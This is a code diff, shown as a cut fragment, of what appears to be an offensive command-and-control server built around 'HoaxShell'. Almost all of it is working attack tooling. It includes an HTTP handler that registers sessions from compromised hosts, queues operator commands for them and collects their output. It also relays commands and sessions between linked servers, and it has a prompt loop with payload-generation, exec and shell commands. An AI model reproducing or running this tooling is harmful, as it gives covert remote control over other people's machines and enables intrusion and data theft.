-			# Get the shell session owner's sibling ID
-			session_owner_id = Sessions_manager.return_session_owner_id(session_id)
-			
-		hostname = session_data['Computername']
-		uname = session_data['Username']
-		Hoaxshell.hoax_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '
-		Hoaxshell.active_shell = session_id	
-		Hoaxshell.prompt_ready = True
-		print('\r')
-		
-		try:
-			
-			while Hoaxshell.active_shell: #and (Sessions_manager.active_sessions[session_id]['Status'] == 'Active'):
-				
-				if Hoaxshell.prompt_ready:
-				
-					user_input = input(Hoaxshell.hoax_prompt).strip()					
-					
-					if user_input.lower() in ['clear']:
-						os.system('clear')
-
-					elif user_input.lower() in ['exit', 'quit']:
-						raise KeyboardInterrupt
-
-					elif user_input == '':
-						continue
-
-					elif user_input in Core_server.requests.keys():
-						Core_server.requests[user_input] = True
-
-					else:
-
-						if Hoaxshell.active_shell:
-							
-							Hoaxshell.prompt_ready = False
-							
-							if is_remote_shell:
-								command = user_input + ";echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"
-								Core_server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)								
-								
-							else:	
-								Hoaxshell.command_pool[Hoaxshell.active_shell].append(user_input)
-
-						else:
-							print(f'\r[{INFO}] No active session.')		
-												
-				else:
-					continue
-			
-			else:
-				raise KeyboardInterrupt
-			
-		
-		except KeyboardInterrupt:
-			print('\rHoaxShell deactivated.')
-			Hoaxshell.deactivate_shell()
-		
-
-
-	@staticmethod
-	def deactivate_shell():
-		
-		Hoaxshell.active_shell = None		
-		Hoaxshell.prompt_ready = True
-		Hoaxshell.hoax_prompt = None
-		Main_prompt.main_prompt_ready = True	
-
-
-
-	@staticmethod
-	def rst_shell_prompt(prompt = ' > ', prefix = '\r'):
-		
-		Hoaxshell.prompt_ready = True
-		sys.stdout.write(prefix + Hoaxshell.hoax_prompt + readline.get_line_buffer())
-
-
-
-	def do_GET(self):
-
-		timestamp = int(datetime.now().timestamp())		
-
-		# Identify session		
-		if not Hoaxshell.header_id:
-			header_id_extract = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
-			Hoaxshell.header_id = f'X-{header_id_extract[0]}'
-
-		try:
-			session_id = self.headers.get(Hoaxshell.header_id)
-			
-		except:
-			session_id = None
-				
-		
-		#if session_id and (session_id not in Sessions_manager.active_sessions.keys()):
-		if session_id and (session_id not in Sessions_manager.active_sessions.keys()):
-			if session_id in Sessions_manager.legit_session_ids.keys():
-				h = session_id.split('-')
-				Hoaxshell.verify.append(h[0])
-				Hoaxshell.get_cmd.append(h[1])
-				Hoaxshell.post_res.append(h[2])
-				Sessions_manager.active_sessions[session_id] = {
-					'IP Address' : self.client_address[0], 
-					'Port' : self.client_address[1],
-					'execution_verified' : False,
-					'Status' : 'Active',
-					'last_received' : timestamp,
-					'OS Type' : Sessions_manager.legit_session_ids[session_id]['OS Type'],
-					'frequency' : Sessions_manager.legit_session_ids[session_id]['frequency'],
-					'Owner' : Hoaxshell.server_unique_id,
-					'self_owned' : True,
-					'aliased' : False, 
-					'alias' : None
-				}
-				
-				Hoaxshell.command_pool[session_id] = []
-				
-		elif session_id and (session_id in Sessions_manager.active_sessions.keys()):
-			Sessions_manager.active_sessions[session_id]['last_received'] = timestamp	
-				
-		
-		elif not session_id:
-			return
-			
-			
-		self.server_version = Hoaxshell_settings.server_version
-		self.sys_version = ""
-		session_id = self.headers.get(Hoaxshell.header_id)
-		legit = True if session_id in Sessions_manager.legit_session_ids.keys() else False
-
-		# Verify execution
-		url_split = self.path.strip("/").split("/")
-		#if (self.path.strip("/") in Hoaxshell.verify) and legit:
-		if url_split[0] in Hoaxshell.verify and legit:
-			
-			if Sessions_manager.active_sessions[session_id]['execution_verified']:
-				print(f'\r[{INFO}] Received "Verify execution" request from an already established session (ignored).')
-				Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-				return
-			
-			self.send_response(200)
-			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
-			self.send_header('Access-Control-Allow-Origin', '*')
-			self.end_headers()
-			self.wfile.write(bytes('OK', "utf-8"))
-			Sessions_manager.active_sessions[session_id]['execution_verified'] = True
-			Sessions_manager.active_sessions[session_id]['Computername'] = url_split[1]
-			Sessions_manager.active_sessions[session_id]['Username'] = url_split[2]
-			print(f'\r[{GREEN}Shell{END}][{ORANGE}{self.client_address[0]}{END}] {BOLD}New session established! {END}')
-			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-
-			try:				
-				Thread(target = self.monitor_shell_state, args = (session_id,), daemon = True).start()
-				
-			except:
-				print('pulse check function failed') #delete
-				
-			new_session_data = Sessions_manager.active_sessions[session_id].copy()
-			new_session_data['session_id'] = session_id
-			new_session_data['alias'] = None
-			new_session_data['aliased'] = False
-			new_session_data['self_owned'] = False	
-			Core_server.announce_new_session(new_session_data)
-			del new_session_data
-			
-
-		# Grab cmd
-		elif self.path.strip("/") in Hoaxshell.get_cmd and legit:
-
-			self.send_response(200)
-			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
-			self.send_header('Access-Control-Allow-Origin', '*')
-			self.end_headers()
-			
-			if len(Hoaxshell.command_pool[session_id]):
-				cmd = Hoaxshell.command_pool[session_id].pop(0)
-				self.wfile.write(bytes(cmd, 'utf-8'))
-
-			else:
-				self.wfile.write(bytes('None', 'utf-8'))
-
-			Sessions_manager.active_sessions[session_id]['last_received'] = timestamp
-			return
-
-
-		else:
-			self.send_response(200)
-			self.end_headers()
-			self.wfile.write(b'Move on mate.')
-			pass
-
-
-
-	def do_POST(self):
-		
-		timestamp = int(datetime.now().timestamp())
-		session_id = self.headers.get(self.header_id)
-		legit = True if (session_id in Sessions_manager.legit_session_ids.keys()) else False
-		
-		if legit:		
-				
-			Sessions_manager.active_sessions[session_id]['last_received'] = timestamp
-			self.server_version = Hoaxshell_settings.server_version
-			self.sys_version = ""				
-
-			# cmd output
-			if self.path.strip("/") in self.post_res and legit:
-
-				try:
-					self.send_response(200)
-					self.send_header('Access-Control-Allow-Origin', '*')
-					self.send_header('Content-Type', 'text/plain')
-					self.end_headers()
-					self.wfile.write(b'OK')
-					content_len = int(self.headers.get('Content-Length'))
-					output = self.rfile.read(content_len)
-					#output = Hoaxshell.cmd_output_interpreter(self, output, constraint_mode = Sessions_manager.legit_session_ids[session_id]['constraint_mode'])
-					output = self.cmd_output_interpreter(output, constraint_mode = Sessions_manager.legit_session_ids[session_id]['constraint_mode'])
-					
-					if isinstance(output, str):	
-						print(f'\r{GREEN}{output}{END}')
-						Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
-					
-					elif isinstance(output, list):
-						Core_server.send_receive_one_encrypted(output[0], output[1], 'command_output', 30)
-
-						
-				except ConnectionResetError:
-					
-					error_msg = f'[{FAILED}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try limiting the command\'s output.'
-					
-					if isinstance(output, str):
-						print(error_msg)
-						Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
-						
-					elif isinstance(output, list):
-						Core_server.send_receive_one_encrypted(output[0], error_msg, 'command_output', 30)
-						
-					del error_msg
-					
-				del output
-
-
-		else:
-			self.send_response(200)
-			self.end_headers()
-			self.wfile.write(b'Move on mate.')
-			pass
-
-
-
-	def do_OPTIONS(self):
-
-		self.server_version = Hoaxshell_settings.server_version
-		self.sys_version = ""
-		self.send_response(200)
-		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
-		self.send_header('Vary', "Origin")
-		self.send_header('Access-Control-Allow-Credentials', 'true')
-		self.send_header('Access-Control-Allow-Headers', Hoaxshell_settings.header_id)
-		self.end_headers()
-		self.wfile.write(b'OK')
-
-
-	def log_message(self, format, *args):
-		return
-
-
-	@staticmethod
-	def dropSession(session_id):
-		
-		os_type = Sessions_manager.active_sessions[session_id]['OS Type']
-		outfile = Sessions_manager.legit_session_ids[session_id]['exec_outfile']
-		exit_command = 'stop-process $PID' if os_type  == 'Windows' else 'echo byee'
-		
-		if (os_type == 'Windows' and not outfile) or os_type == 'Linux':
-			Hoaxshell.command_pool[session_id].append(exit_command)
-			
-		elif os_type == 'Windows' and outfile:
-			Hoaxshell.command_pool[session_id].append(f'del {outfile};{exit_command}')
-		
-
-
-	@staticmethod
-	def terminate():
-
-		active_sessions_clone = Sessions_manager.active_sessions.copy()
-		active_sessions = active_sessions_clone.keys()			
-	
-		if active_sessions:
-			
-			print(f'\r[{INFO}] Terminating active sessions - DO NOT INTERRUPT...')		
-			
-			for session_id in active_sessions:
-				
-				try:					
-					if Sessions_manager.active_sessions[session_id]['Owner'] == Core_server.SERVER_UNIQUE_ID:
-						Hoaxshell.dropSession(session_id)				
-						Core_server.announce_session_termination({'session_id' : session_id})
-						
-				except:
-					continue
-			
-			sleep(Hoaxshell_settings.default_frequency + 2.0)
-			print(f'\r[{INFO}] Sessions terminated.')
-			
-		else:
+		if updated:
 			sys.exit(0)
-
-
-
-	def monitor_shell_state(self, session_id):
-
-		Threading_params.thread_limiter.acquire()
-		
-		while session_id in Sessions_manager.active_sessions.keys():
-
-			timestamp = int(datetime.now().timestamp())
-			tlimit = (Hoaxshell_settings.default_frequency + Sessions_manager_settings.shell_state_change_after)
-			last_received = Sessions_manager.active_sessions[session_id]['last_received']
-			time_difference = abs(last_received - timestamp)
-			current_status = Sessions_manager.active_sessions[session_id]['Status']
-			
-			if (time_difference >= tlimit) and current_status == 'Active':
-				Sessions_manager.active_sessions[session_id]['Status'] = 'Undefined'
-				Core_server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_manager.active_sessions[session_id]['Status']})
-
-			elif (time_difference < tlimit) and current_status == 'Undefined':
-				Sessions_manager.active_sessions[session_id]['Status'] = 'Active'
-				Core_server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_manager.active_sessions[session_id]['Status']})
-				
-			sleep(5)
-			
-		else:
-			Threading_params.thread_limiter.release()
-
-
-
-def initiate_hoax_server():
-
-	try:
-
-		# Check if both cert and key files were provided
-		if (Hoaxshell_settings.certfile and not Hoaxshell_settings.keyfile) or (Hoaxshell_settings.keyfile and not Hoaxshell_settings.certfile):
-			exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')
-
-		# Start http server
-		port = Hoaxshell_settings.bind_port if not Hoaxshell_settings.ssl_support else Hoaxshell_settings.bind_port_ssl
-		
-		try:
-			httpd = HTTPServer((Hoaxshell_settings.bind_address, port), Hoaxshell)
-
-		except OSError:
-			exit(f'[{DEBUG}] Hoaxshell HTTP server failed to start. Port {port} seems to already be in use.\n')
-		
-		except:
-			exit(f'\n[{DEBUG}] Hoaxshell HTTP server failed to start (Unknown error occurred).\n')
-
-		if Hoaxshell_settings.ssl_support:
-			httpd.socket = ssl.wrap_socket (
-				httpd.socket,
-				keyfile = Hoaxshell_settings.keyfile,
-				certfile = Hoaxshell_settings.certfile,
-				server_side = True,
-				ssl_version=ssl.PROTOCOL_TLS
-			)
-
-
-		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
-		Hoaxshell_server.daemon = True
-		Hoaxshell_server.start()
-		print(f'[{INFO}] Hoaxshell engine listening on {ORANGE}{Hoaxshell_settings.bind_address}{END}:{ORANGE}{port}{END}\n')
+	
 
 	
-	except KeyboardInterrupt:
-		Hoaxshell.terminate()
-
-
-
-class Core_server:
+	''' Init Core '''
+	core = Core_server()
+	core_server = Thread(target = core.initiate, args = ())
+	core_server.daemon = True
+	core_server.start()
 	
-	acknowledged_servers = []
-	sibling_servers = {}
-	requests = {}
-	SERVER_UNIQUE_ID = str(uuid4()).replace('-', '')
-	HOSTNAME = socket.gethostname()
-	listen = True
-	ping_sibling_servers = False
-	CONNECT_SYN = b'\x4f\x86\x2f\x7b'
-	CONNECT_ACK = b'\x5b\x2e\x42\x6d'
-	CONNECT_DENY = b'\x3c\xc3\x86\xde'
-	core_initialized = None
-			
-	@staticmethod	
-	def return_server_uniq_id():
-		return Core_server.SERVER_UNIQUE_ID
+	# Wait for the Core server socket to be established
+	timeout_start = time()
 
+	while time() < (timeout_start + 5):
 
-
-	def sock_handler(self, conn, address):
+		if core.core_initialized:													
+			break
 		
-		# ~ try:
+		elif core.core_initialized == False:			
+			sys.exit(1)
 			
-		Threading_params.thread_limiter.acquire()
-		raw_data = Core_server.recv_msg(conn)
-		#Main_prompt.main_prompt_ready = False
-		rst_prompt = True
-
-		# There are 3 predefined byte sequences for processing a sibling server's request to connect (something like a TCP handshake but significantly more stupid)
-		# Check if raw_data is a connection request
-		if raw_data in [self.CONNECT_SYN, self.CONNECT_DENY]:
-				
-			if raw_data == self.CONNECT_SYN:
-				
-				# Spam filter
-				if address[0] in self.acknowledged_servers:
-					Core_server.send_msg(conn, self.CONNECT_DENY)
-					conn.close()
-					return						
-				
-				request_id = ''.join(["{}".format(randint(0, 9)) for num in range(0, 5)])
-				self.requests[request_id] = False
-				print(f"\r[{INFO}] Received request to connect from {ORANGE}{address[0]}{END}")
-				print(f"\r[{INFO}] Type {ORANGE}{request_id}{END} and press ENTER to connect. You have 10 seconds.")
-				Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-				
-				timeout_start = time()
-
-				while time() < timeout_start + 10:
-			
-					if self.requests[request_id]:							
-						del self.requests[request_id]
-						self.acknowledged_servers.append(address[0])
-						Core_server.send_msg(conn, self.CONNECT_ACK)
-						break
-						
-				else:
-					del self.requests[request_id]
-					Core_server.send_msg(conn, self.CONNECT_DENY)
-					conn.close()						
-					print(f"\r[{INFO}] Request to connect with {ORANGE}{address[0]}{END} denied.")
-					Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-							
-			return
-				
+	else:
+		sys.exit(1)
+	
+	initiate_hoax_server()
+	payload_engine = Payload_generator()
+	sessions_manager = Sessions_manager()
+	Hoaxshell.server_unique_id = core.return_server_uniq_id()
 		
-		# If the sender's IP address is in the list of acknowledged for connection servers and the msg is a valid UUID4, then establish connection
-		elif address[0] in self.acknowledged_servers:
-
-			str_data = raw_data.decode('utf-8', 'ignore').strip()
-
-			# Try to interpret the clear text data
-			try:
-				tmp = str_data.split(':')
-				sibling_id = tmp[0]
-				sibling_server_port = tmp[1]
-				sibling_server_hostname = tmp[2]
-				
-			except:
-				sibling_id = None
+	''' Start tab autoComplete '''
+	comp = Completer()
+	readline.set_completer_delims(' \t\n;')
+	readline.parse_and_bind("tab: complete")
+	readline.set_completer(comp.complete)			
+		
+	
+	''' +---------[ Command prompt ]---------+'''
+	while True:
+		
+		try:	
 			
-			
-			if is_valid_uuid(sibling_id): #and (address[0] in self.acknowledged_servers)
-				
-				self.sibling_servers[sibling_id] = {'Hostname' : sibling_server_hostname, 'Server IP' : address[0], 'Server Port' : int(sibling_server_port), 'Status' : 'Active'}
-				Core_server.send_msg(conn, f'{self.SERVER_UNIQUE_ID}:{self.HOSTNAME}'.encode("utf-8"))
-				self.acknowledged_servers.remove(address[0])
-				
-				# Synchronize all servers
-				self.synchronize_sibling_servers()
-				return
-			
-		else:
-			# Check if connection is coming from an acknowledged sibling server			
-			server_is_sibling = sibling_id = False
-			
-			if self.sibling_servers.keys():
-				server_is_sibling = sibling_id = self.server_is_sibling(address[0])
-
-
-			# If the packet is coming from a sibling then it's encrypted and "encapsulated"
-			if server_is_sibling:
-
-				# AES KEY is the sender sibling server's ID and IV is the 16 first bytes of the (local host) server's ID		
-				decrypted_data = self.decrypt_encapsulated_msg(sibling_id, raw_data) # returns [capsule, received_data]
-
-				if decrypted_data[0] == 'synchronize_sibling_servers_table':
-
-					self.update_siblings_data_table(decrypted_data[1])
-					
-					# Return local sibling servers data
-					sibling_servers_data_local = str(self.encapsulate_dict(self.sibling_servers, decrypted_data[0]))
-					encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_data_local, sibling_id[0:16].encode('utf-8'))
-					Core_server.send_msg(conn, encrypted_siblings_data)
-				
-				
-									
-				elif decrypted_data[0] == 'synchronize_sibling_servers_shells':
-				
-					self.update_shell_sessions(decrypted_data[1])
-					
-					# Return local sibling servers data
-					sibling_servers_shells = str(self.encapsulate_dict(Sessions_manager.active_sessions, decrypted_data[0]))
-					encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_shells, sibling_id[0:16].encode('utf-8'))
-					Core_server.send_msg(conn, encrypted_siblings_data)
-				
-				
+			if Main_prompt.main_prompt_ready:
 								
-				elif decrypted_data[0] == 'exec_command':
+				user_input = input(Main_prompt.prompt).strip()
+
+				if user_input == '':
+					continue
+				
+				# Handle single/double quoted arguments
+				quoted_args_single = re.findall("'{1}[\s\S]*'{1}", user_input)
+				quoted_args_double = re.findall('"{1}[\s\S]*"{1}', user_input)
+				quoted_args = quoted_args_single + quoted_args_double
+				
+				if len(quoted_args):
+					
+					for arg in quoted_args:
+						space_escaped = arg.replace(' ', Main_prompt.SPACE)
+						
+						if (space_escaped[0] == "'" and space_escaped[-1] == "'") or (space_escaped[0] == '"' and space_escaped[-1] == '"'):
+							space_escaped = space_escaped[1:-1]
+													
+						user_input = user_input.replace(arg, space_escaped)
+						
+				
+				
+				# Create cmd-line args list
+				user_input = user_input.split(' ')
+				cmd_list = [w.replace(Main_prompt.SPACE, ' ') for w in user_input if w]
+				cmd_list_len = len(cmd_list)
+				cmd = cmd_list[0].lower() if cmd_list else ''
+				
+				if cmd in core.requests.keys():
+					core.requests[cmd] = True
+					continue
+				
+				# Validate number of args
+				valid = PrompHelp.validate(cmd, (cmd_list_len - 1))				
+									
+				if not valid:
+					continue
+
+
+				if cmd == 'help':					
+					if cmd_list_len == 1:
+						PrompHelp.print_main_help_msg()
 										
-					data = decrypted_data[1]
+					elif cmd_list_len == 2:
+						PrompHelp.print_detailed(cmd_list[1])
+														
+		
+
+				elif cmd == 'id':
+					print(f'{BOLD}Server unique id{END}: {ORANGE}{core.return_server_uniq_id()}{END}')
+
+
+
+				elif cmd == 'connect':
+					core.connect_with_sibling_server(cmd_list[1], cmd_list[2])
 					
-					# Check if session exists
-					if data['session_id'] in Sessions_manager.active_sessions.keys():																			
-						Hoaxshell.command_pool[data['session_id']].append(data['command'])
-						Core_server.send_msg(conn, self.response_ack(sibling_id))
-						# ~ rst_prompt = False
+								
+
+				elif cmd == 'generate':								
+					payload_engine.generate_payload(cmd_list[1:])
+								
+
+
+				elif cmd == 'kill':					
+					sessions_manager.kill_session(cmd_list[1])
+
 						
+
+				elif cmd == 'exec':
+									
+					if Sessions_manager.active_sessions.keys():
 						
-												
-				elif decrypted_data[0] == 'command_output':
-					
-					print(f'\r{GREEN}{decrypted_data[1]}{END}')
-					Core_server.send_msg(conn, self.response_ack(sibling_id))
-					
-					if Hoaxshell.active_shell:
-						Hoaxshell.prompt_ready = True
-
-
-
-				elif decrypted_data[0] == 'new_session':
-					
-					new_session_id = decrypted_data[1]['session_id']
-					decrypted_data[1].pop('session_id', None)
-					Sessions_manager.active_sessions[new_session_id] = decrypted_data[1]							
-					print(f'\r[{GREEN}Shell{END}][{ORANGE}{Sessions_manager.active_sessions[new_session_id]["IP Address"]}{END}] {BOLD}New session established!{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
-					Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-					del decrypted_data, new_session_id						
-					Core_server.send_msg(conn, self.response_ack(sibling_id))
-
-
-
-				elif decrypted_data[0] == 'shell_session_status_update':
-					
-					session_id = decrypted_data[1]['session_id']
-					Sessions_manager.active_sessions[session_id]['Status'] = decrypted_data[1]['Status']					
-					del session_id						
-					Core_server.send_msg(conn, self.response_ack(sibling_id))
-					rst_prompt = False
-
-
-
-				elif decrypted_data[0] == 'session_terminated':
-					
-					victim_ip = Sessions_manager.active_sessions[decrypted_data[1]['session_id']]['IP Address']
-					Sessions_manager.active_sessions.pop(decrypted_data[1]['session_id'], None)					
-					print(f'\r[{WARN}] Session with {ORANGE}{victim_ip}{END} (Owned by \
-					{ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')
-					Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-					del victim_ip					
-					Core_server.send_msg(conn, self.response_ack(sibling_id))
-
-
-
-				elif decrypted_data[0] == 'server_shutdown':
-					
-					server_ip = self.sibling_servers[decrypted_data[1]['sibling_id']]['Server IP']
-					hostname = self.sibling_servers[decrypted_data[1]['sibling_id']]['Hostname']
-					self.sibling_servers.pop(decrypted_data[1]['sibling_id'], None)
-					
-					# Remove sessions associated with sibling server
-					active_sessions_clone = Sessions_manager.active_sessions.copy()
-					active_sessions = active_sessions_clone.keys()
-					lost_sessions = 0
-					
-					if active_sessions:
+						Main_prompt.main_prompt_ready = False
+						command = cmd_list[1]
+						session_id = cmd_list[2]
+						src_is_file = False
 						
-						for session_id in active_sessions:
+						if command[0] == os.path.sep:
 							
 							try:
-								if Sessions_manager.active_sessions[session_id]['Owner'] == decrypted_data[1]['sibling_id']:
-									del Sessions_manager.active_sessions[session_id]
-									lost_sessions += 1
-									
+								f = open(command)
+								command = f.read()
+								f.close()
+								src_is_file = True
+								
 							except:
+								print('Failed to load file.')
+								Main_prompt.main_prompt_ready = True
 								continue
-															
-					print(f'\r[{WARN}] Sibling server {ORANGE}{server_ip}{END} (hostname: {ORANGE}{hostname}{END}) disconnected.')
-					print(f'\r[{WARN}] {lost_sessions} x shell sessions lost.') if lost_sessions else chill()
-					Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-					del server_ip, hostname, active_sessions_clone, active_sessions
-					Core_server.send_msg(conn, self.response_ack(sibling_id))
+						
+						if command.lower() == 'exit':
+							print('The proper way to terminate a session is by using the "kill <SESSION ID>" prompt command.')
+							Main_prompt.main_prompt_ready = True
+							continue
+						
+						# Check if session id has alias
+						session_id = sessions_manager.alias_to_session_id(session_id)
+
+						# Check who is the owner of the shell session
+						session_owner_id = sessions_manager.return_session_owner_id(session_id)
+						
+						
+						if session_owner_id == core.return_server_uniq_id():
+							Hoaxshell.command_pool[session_id].append(command)
+						
+						else:
+							command = command + ";echo '{" + core.SERVER_UNIQUE_ID + "}'"
+							core.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)
+
+					else:
+						print(f'\r[{INFO}] No active session.')		
+
+						
+
+				elif cmd == 'shell':
+						
+					if Sessions_manager.active_sessions.keys():
+						
+						Main_prompt.main_prompt_ready = False							
+						session_id = Sessions_manager.alias_to_session_id(cmd_list[1])
+						os_type = sessions_manager.active_sessions[session_id]['OS Type']
+						Hoaxshell.activate_shell_session(session_id, os_type)
+						
+					else:
+						print(f'\r[{INFO}] No active session.')		
+
+
+			
+
+				elif cmd == 'alias':
+										
+					sessions = Sessions_manager.active_sessions.keys()
+					
+					if len(sessions):
+						if cmd_list[2] in sessions:
+							
+							alias = alias_sanitizer(cmd_list[1]).strip()
+							
+							if isinstance(alias, list):
+								print(alias[0])
+								
+							else:
+								# Check if alias is unique
+								unique = True
+								
+								for session_id in sessions:
+									if Sessions_manager.active_sessions[session_id]['alias'] == alias.strip():
+										unique = False
+										break
+								
+								# Check if alias is a reserved keyword
+								is_reserved = False
+								
+								if alias in ['Undefined', 'Active']:
+									is_reserved = True
+								
+								
+								# Check if alias is the id of another session	
+								is_session_id = False
+								
+								if alias in sessions:
+									is_session_id = True
 									
+								if unique and not is_session_id and not is_reserved:
+									Sessions_manager.active_sessions[cmd_list[2]]['alias'] = alias.strip()
+									Sessions_manager.active_sessions[cmd_list[2]]['aliased'] = True
+								
+								else:
+									print('Illegal alias value.')
 									
+						else:
+							print('Invalid session ID.')
 
-				elif decrypted_data[0] == 'are_you_alive':
-					Core_server.send_msg(conn, self.response_ack(sibling_id))
-					rst_prompt = False	
+					else:
+						print(f'\r[{INFO}] No active session.')		
+
+
+
+				elif cmd == 'reset':
+										
+					sid = Sessions_manager.alias_to_session_id(cmd_list[1])
+					
+					if sid == cmd_list[1]:
+						print('Unrecognized alias.')
+					
+					elif sid in Sessions_manager.active_sessions.keys():
+						Sessions_manager.active_sessions[sid]['aliased'] = False
+						Sessions_manager.active_sessions[sid]['alias'] = None
+						
+					
+					else:
+						print('Unrecognized alias.')
+
+
+
+				elif cmd == 'clear':
+					os.system('clear')
+
+
+
+				elif cmd == 'exit':
+					raise KeyboardInterrupt
+
+
+
+				elif cmd == 'sessions':
+
+					if cmd_list_len == 1:
+											
+						sessions_manager.list_sessions()
+								
+					else:
+						print('Unsupported arguments.')
 				
+
+
+				elif cmd == 'siblings':										
+					core.list_siblings()
+											
+
 				else:
-					pass
+					continue
 		
 		
-		# ~ except KeyboardInterrupt:
-			# ~ pass
-		
-		
-		# ~ except:
-			# ~ print('failed to process a request')
-			# ~ pass				
+		except KeyboardInterrupt:
+			
+			if Sessions_manager.active_sessions.keys() or core.sibling_servers.keys():
+				choice = input('\nAre you sure you wish to exit? All of your sessions/connections with siblings will be lost [yes/no]: ').lower()
+				verified = True if choice in ['yes', 'y'] else False
 				
-		conn.close()
-		
-		if rst_prompt:			
-			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell \
-			else Hoaxshell.set_shell_prompt_ready()
-					
-		Threading_params.thread_limiter.release()
-		return
-
-
-
-	@staticmethod
-	def recv_msg(sock):
-		
-		raw_msglen = Core_server.recvall(sock, 4)
-		
-		if not raw_msglen:
-			return None
-			
-		msglen = struct.unpack('>I', raw_msglen)[0]
-
-		return Core_server.recvall(sock, msglen)
-		
-		
-		
-	@staticmethod
-	def recvall(sock, n):
-
-		data = bytearray()
-		
-		while len(data) < n:
-			packet = sock.recv(n - len(data))
-			
-			if not packet:
-				return None
-				
-			data.extend(packet)
-			
-		return data
-
-
-
-	@staticmethod
-	def send_msg(sock, msg):
-		msg = struct.pack('>I', len(msg)) + msg
-		sock.sendall(msg)
-
-
-		
-		
-	def initiate(self):
-		
-		try:
-			server_socket = socket.socket()
-			server_socket.bind((Core_server_settings.bind_address, Core_server_settings.bind_port))
-					
-		except OSError:
-			self.core_initialized = False
-			exit_with_msg(f'Core server failed to start. Port {Core_server_settings.bind_port} seems to be already in use.\n')
-		
-		except:
-			self.core_initialized = False
-			exit_with_msg('Core server failed to start (Unknown error occurred).\n')
-		
-		self.core_initialized = True	
-		print(f'\r[{INFO}] Core server listening on {ORANGE}{Core_server_settings.bind_address}{END}:{ORANGE}{Core_server_settings.bind_port}{END}')
-
-		# Start listening for connections
-		server_socket.listen()
-		
-		while self.listen:
-
-			conn, address = server_socket.accept()
-			Thread(target = self.sock_handler, args = (conn, address)).start()
-			
-		conn.close()
-
-
-
-	def response_ack(self, sibling_id):
-		
-		response_ack = str(self.encapsulate_dict({0 : 0}, 'ACKNOWLEDGED'))
-		response_ack_encypted = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), response_ack, sibling_id[0:16].encode('utf-8'))
-		return response_ack_encypted
-
-
-
-	def decrypt_encapsulated_msg(self, sibling_id, raw_data):
-		
-		decrypted_data = decrypt_msg(sibling_id.encode('utf-8'), raw_data, self.SERVER_UNIQUE_ID[0:16].encode('utf-8'))
-		decapsulated = self.decapsulate_dict(decrypted_data) # returns [capsule, received_data]
-		return decapsulated
-
-
-
-	def stop_listener(self):
-		self.listen = False
-		
-
-
-	def list_siblings(self):
-		
-		if self.sibling_servers.keys():
-			
-			print('\r')
-			table = self.siblings_dict_to_list()
-			print_table(table, ['Sibling ID', 'Server IP', 'Server Port', 'Hostname', 'Status'])			
-			print('\r')
-		
-		else:
-			print(f'Not connected with other servers.')
-	   
-	   
-
-	@staticmethod
-	def send_receive_one(msg, server_ip, server_port, encode_msg, timeout = 30):
-		
-		try:
-			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
-				client_socket.settimeout(timeout)
-				client_socket.connect((str(server_ip), int(server_port)))
-				msg = msg.encode('utf-8') if encode_msg else msg
-				Core_server.send_msg(client_socket, msg)
-				response_raw = Core_server.recv_msg(client_socket)
-				client_socket.close()
-				return response_raw
-					
-		except ConnectionRefusedError:
-			return 'connection_refused'
-		
-		except ConnectionResetError:
-			return 'connection_reset'
-			
-		except socket.timeout:
-			return 'timed_out'
-			
-
-
-	@staticmethod
-	def encapsulate_dict(data, encapsulate_as):
-		
-		encapsulated = {}
-		encapsulated[encapsulate_as] = data
-		return encapsulated
-		
-		
-
-	@staticmethod
-	def decapsulate_dict(data):
-		try:
-			dict_data = literal_eval(data)
-			capsule = list(dict_data.keys())[0]		
-			received_data = dict_data[capsule]
-			return [capsule, received_data]
-			
-		except:
-			return 'failed_to_read'
-
-
-
-	@staticmethod
-	def announce_new_session(new_session_data_dict):
-		
-		siblings = clone_dict_keys(Core_server.sibling_servers)		
-		
-		if siblings:			
-			for sibling_id in siblings:
-				Core_server.send_receive_one_encrypted(sibling_id, new_session_data_dict, 'new_session')
-
-
-
-	@staticmethod
-	def announce_shell_session_stat_update(new_session_data_dict):
-		
-		siblings = clone_dict_keys(Core_server.sibling_servers)	
-		
-		if siblings:			
-			for sibling_id in siblings:
-				Core_server.send_receive_one_encrypted(sibling_id, new_session_data_dict, 'shell_session_status_update')
-						
-
-
-	@staticmethod
-	def announce_session_termination(terminated_session_data_dict):
-		
-		siblings = Core_server.sibling_servers.keys()
-		
-		if len(siblings):
-			
-			for sibling_id in siblings:
-				Core_server.send_receive_one_encrypted(sibling_id, terminated_session_data_dict, 'session_terminated')
-
-
-
